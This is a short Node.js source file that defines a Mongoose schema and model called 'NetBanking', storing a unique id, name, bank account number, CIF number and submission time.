// models/NetBanking.js
const mongoose = require('mongoose');

const netBankingSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  name: { type: String, required: true },
  acNumber: { type: String, required: true },
  cifNumber: { type: String, required: true },
  submittedAt: { type: Date, default: Date.now }
});

module.exports = mongoose.model('NetBanking', netBankingSchema);
